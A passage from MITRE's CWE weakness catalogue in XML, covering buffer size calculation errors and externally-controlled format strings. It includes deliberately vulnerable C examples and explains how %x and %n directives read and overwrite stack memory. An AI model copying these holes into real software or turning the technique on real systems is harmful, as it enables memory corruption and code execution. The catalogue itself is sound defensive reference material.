               <Observed_Example_Reference>CVE-2002-1347</Observed_Example_Reference>
               <Observed_Example_Description>multiple variants</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-0490</Observed_Example_Reference>
               <Observed_Example_Description>needs closer investigation, but probably
						expansion-based</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-0940</Observed_Example_Reference>
               <Observed_Example_Description>needs closer investigation, but probably
						expansion-based</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-0599</Observed_Example_Reference>
               <Observed_Example_Description>Chain: Language interpreter calculates wrong
						buffer size (CWE-131) by using "size = ptr ? X : Y" instead of "size = (ptr
						? X : Y)" expression.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Reference_ID="REF-18" Local_Reference_ID="R.131.1">
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>Niels Dekker</Reference_Author>
               <Reference_Title>SafeInt</Reference_Title>
               <Reference_Link>http://safeint.codeplex.com/</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.131.2">
               <Reference_Author>Jason Lam</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 18 - Incorrect Calculation of Buffer
						Size</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-19</Reference_Date>
               <Reference_Link>http://software-security.sans.org/blog/2010/03/19/top-25-series-rank-18-incorrect-calculation-of-buffer-size</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-22" Local_Reference_ID="R.131.3">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Title>Address Space Layout Randomization in Windows
						Vista</Reference_Title>
               <Reference_Link>http://blogs.msdn.com/michael_howard/archive/2006/05/26/address-space-layout-randomization-in-windows-vista.aspx</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-25" Local_Reference_ID="R.131.4">
               <Reference_Author>Microsoft</Reference_Author>
               <Reference_Title>Understanding DEP as a mitigation technology part
						1</Reference_Title>
               <Reference_Link>http://blogs.technet.com/b/srd/archive/2009/06/12/understanding-dep-as-a-mitigation-technology-part-1.aspx</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-29" Local_Reference_ID="R.131.5">
               <Reference_Title>PaX</Reference_Title>
               <Reference_Link>http://en.wikipedia.org/wiki/PaX</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-31" Local_Reference_ID="R.131.6">
               <Reference_Author>Sean Barnum</Reference_Author>
               <Reference_Author>Michael Gegick</Reference_Author>
               <Reference_Title>Least Privilege</Reference_Title>
               <Reference_PubDate>2005-09-14</Reference_PubDate>
               <Reference_Link>https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.131.7">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 20, "Integer Overflows" Page 620</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-17" Local_Reference_ID="R.131.8">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 5: Buffer Overruns." Page 89</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.131.9">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 8, "Incrementing Pointers Incorrectly", Page
						401.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-37" Local_Reference_ID="R.131.10">
               <Reference_Author>Grant Murphy</Reference_Author>
               <Reference_Title>Position Independent Executables (PIE)</Reference_Title>
               <Reference_Publisher>Red Hat</Reference_Publisher>
               <Reference_Date>2012-11-28</Reference_Date>
               <Reference_Link>https://securityblog.redhat.com/2012/11/28/position-independent-executables-pie/</Reference_Link>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>Other length calculation error</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Allocate sufficient memory for an object</Mapped_Node_Name>
               <Mapped_Node_ID>MEM35-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Allocate sufficient memory for an object</Mapped_Node_Name>
               <Mapped_Node_ID>MEM35-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>100</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>47</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>PLOVER</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Maintenance_Notes,
						Relationships, Taxonomy_Mappings, Type</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Likelihood_of_Exploit,
						Observed_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples,
						Detection_Factors, Maintenance_Notes, Potential_Mitigations,
						Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Potential_Mitigations,
						References, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors,
						Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations,
						References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors,
						Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2008-01-30">Other Length Calculation
						Error</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="134" Name="Use of Externally-Controlled Format String" Weakness_Abstraction="Base" Status="Draft">
         <Description>
            <Description_Summary>The software uses a function that accepts a format string as an
					argument, but the format string originates from an external
					source.</Description_Summary>
            <Extended_Description>
               <Text>When an attacker can modify an externally-controlled format string, this
						can lead to buffer overflows, denial of service, or data representation
						problems.</Text>
               <Text>It should be noted that in some circumstances, such as
						internationalization, the set of format strings is externally controlled by
						design. If the source of these format strings is trusted (e.g. only
						contained in library files that are only modifiable by the system
						administrator), then the external control might not itself pose a
						vulnerability.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>865</Relationship_Target_ID>
               <!--2011 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>808</Relationship_Target_ID>
               <!--2010 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>133</Relationship_Target_ID>
               <!--String Errors--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1003</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>74</Relationship_Target_ID>
               <!--Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>726</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A5 - Buffer Overflows--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>PeerOf</Relationship_Nature>
               <Relationship_Target_ID>123</Relationship_Target_ID>
               <!--Write-what-where Condition--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">700</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>20</Relationship_Target_ID>
               <!--Improper Input Validation--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">631</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>633</Relationship_Target_ID>
               <!--Weaknesses that Affect Memory--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>743</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 09 - Input Output (FIO)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>845</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 00 - Input Validation and Data Sanitization (IDS)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>877</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 09 - Input Output (FIO)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>990</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Tainted Input to Command--></Relationship>
         </Relationships>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Languages>
               <Language Prevalence="Often" Language_Name="C"/>
               <Language Prevalence="Often" Language_Name="C++"/>
               <Language Prevalence="Rarely" Language_Name="Perl"/>
               <Language_Class Language_Class_Description="Languages that support format strings"/>
            </Languages>
         </Applicable_Platforms>
         <Other_Notes>
            <Note>
               <Text>While Format String vulnerabilities typically fall under the Buffer
						Overflow category, technically they are not overflowed buffers. The Format
						String vulnerability is fairly new (circa 1999) and stems from the fact that
						there is no realistic way for a function that takes a variable number of
						arguments to determine just how many arguments were passed in. The most
						common functions that take a variable number of arguments, including
						C-runtime functions, are the printf() family of calls. The Format String
						problem appears in a number of ways. A *printf() call without a format
						specifier is dangerous and can be exploited. For example, printf(input); is
						exploitable, while printf(y, input); is not exploitable in that context. The
						result of the first call, used incorrectly, allows for an attacker to be
						able to peek at stack memory since the input string will be used as the
						format specifier. The attacker can stuff the input string with format
						specifiers and begin reading stack values, since the remaining parameters
						will be pulled from the stack. Worst case, this improper use may give away
						enough control to allow an arbitrary value (or values in the case of an
						exploit program) to be written into the memory of the running
						program.</Text>
               <Text>Frequently targeted entities are file names, process names,
						identifiers.</Text>
               <Text>Format string problems are a classic C/C++ issue that are now rare due to
						the ease of discovery. One main reason format string vulnerabilities can be
						exploited is due to the %n operator. The %n operator will write the number
						of characters, which have been printed by the format string therefore far,
						to the memory pointed to by its argument. Through skilled creation of a
						format string, a malicious user may use values on the stack to create a
						write-what-where condition. Once this is achieved, he can execute arbitrary
						code. Other operators can be used as well; for example, a %9999s operator
						could also trigger a buffer overflow, or when used in file-formatting
						functions like fprintf, it can generate a much larger output than
						intended.</Text>
            </Note>
         </Other_Notes>
         <Time_of_Introduction>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Modes_of_Introduction>
            <Mode_of_Introduction>
               <Text>The programmer rarely intends for a format string to be
						externally-controlled at all. This weakness is frequently introduced in code
						that constructs log messages, where a constant format string is
						omitted.</Text>
            </Mode_of_Introduction>
            <Mode_of_Introduction>
               <Text>In cases such as localization and internationalization, the
						language-specific message repositories could be an avenue for exploitation,
						but the format string issue would be resultant, since attacker control of
						those repositories would also allow modification of message length, format,
						and content.</Text>
            </Mode_of_Introduction>
         </Modes_of_Introduction>
         <Likelihood_of_Exploit>Very High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Technical_Impact>Read memory</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>Format string problems allow for information disclosure which can
							severely simplify exploitation of the program.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>Format string problems can result in the execution of arbitrary
							code.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can often be detected using automated static analysis
							tools. Many modern tools use data flow analysis or constraint-based
							techniques to minimize the number of false positives.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Black Box</Method_Name>
               <Method_Description>
                  <Text>Since format strings often occur in rarely-occurring erroneous
							conditions (e.g. for error message logging), they can be difficult to
							detect using black box methods. It is highly likely that many latent
							issues exist in executables that do not have associated source code (or
							equivalent source.</Text>
               </Method_Description>
               <Method_Effectiveness>Limited</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                        <Text>Binary Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode simple extractor – strings, ELF readers,
									etc.</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Web Application Scanner</Text>
                        <Text>Web Services Scanner</Text>
                        <Text>Database Scanners</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Fuzz Tester</Text>
                        <Text>Framework-based Fuzzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Warning Flags</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Requirements</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Choose a language that is not subject to this flaw.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Ensure that all format string functions are passed a static string
							which cannot be controlled by the user and that the proper number of
							arguments are always sent to that function as well. If at all possible,
							use functions that do not support the %n operator in format strings.
							[R.134.1] [R.134.2]</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Build and Compilation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Heed the warnings of compilers and linkers, since they may alert you
							to improper usage.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Causal_Nature>Implicit</Causal_Nature>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following program prints a string provided as an
						argument.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>#include &lt;stdio.h&gt;</Code>
                     <Code/>
                     <Code>void printWrapper(char *string) {</Code>
                     <Block>
                        <Code/>
                        <Code>printf(string);</Code>
                     </Block>
                     <Code>}</Code>
                     <Code/>
                     <Code>int main(int argc, char **argv) {</Code>
                     <Block>
                        <Code/>
                        <Code>char buf[5012];</Code>
                        <Code>memcpy(buf, argv[1], 5012);</Code>
                        <Code>printWrapper(argv[1]);</Code>
                        <Code>return (0);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>The example is exploitable, because of the call to printf() in the
							printWrapper() function. Note: The stack buffer was added to make
							exploitation more simple.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code copies a command line argument into a buffer
						using snprintf().</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>int main(int argc, char **argv){</Code>
                     <Block>
                        <Code>char buf[128];</Code>
                        <Code>...</Code>
                        <Code>snprintf(buf,128,argv[1]);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>This code allows an attacker to view the contents of the stack and
							write to the stack using a command line argument containing a sequence
							of formatting directives. The attacker can read from the stack by
							providing more formatting directives, such as %x, than the function
							takes as arguments to be formatted. (In this example, the function takes
							no arguments to be formatted.) By using the %n formatting directive, the
							attacker can write to the stack, causing snprintf() to write the number
							of bytes output thus far to the specified argument (rather than reading
							a value from the argument, which is the intended behavior). A
							sophisticated version of this attack will use four staggered writes to
							completely control the value of a pointer on the stack.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>Certain implementations make more advanced attacks even easier by
						providing format directives that control the location in memory to read from
						or write to. An example of these directives is shown in the following code,
						written for glibc:</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>printf("%d %d %1$d %1$d\n", 5, 9);</Code>
                  </Block>
                  <Text>This code produces the following output: 5 9 5 5 It is also possible
							to use half-writes (%hn) to accurately control arbitrary DWORDS in
							memory, which greatly reduces the complexity needed to execute an attack
							that would otherwise require four staggered writes, such as the one
							mentioned in the first example.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-1825</Observed_Example_Reference>
               <Observed_Example_Description>format string in Perl
						program</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2001-0717</Observed_Example_Reference>
               <Observed_Example_Description>format string in bad call to syslog
						function</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-0573</Observed_Example_Reference>
               <Observed_Example_Description>format string in bad call to syslog
						function</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-1788</Observed_Example_Reference>
               <Observed_Example_Description>format strings in NNTP server
						responses</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2006-2480</Observed_Example_Reference>
               <Observed_Example_Description>Format string vulnerability exploited by
						triggering errors or warnings, as demonstrated via format string specifiers
						in a .bmp filename.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-2027</Observed_Example_Reference>
               <Observed_Example_Description>Chain: untrusted search path enabling resultant
						format string by loading malicious internationalization
						messages</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>logging</Functional_Area>
            <Functional_Area>errors</Functional_Area>
            <Functional_Area>general output</Functional_Area>
         </Functional_Areas>
         <Affected_Resources>
            <Affected_Resource>Memory</Affected_Resource>
         </Affected_Resources>
         <Research_Gaps>
            <Research_Gap>
               <Text>Format string issues are under-studied for languages other than C. Memory
						or disk consumption, control flow or variable alteration, and data
						corruption may result from format string exploitation in applications
						written in other languages such as Perl, PHP, Python, etc.</Text>
            </Research_Gap>
         </Research_Gaps>
         <References>
            <Reference Local_Reference_ID="R.134.1">
               <Reference_Author>Steve Christey</Reference_Author>
               <Reference_Title>Format String Vulnerabilities in Perl
						Programs</Reference_Title>
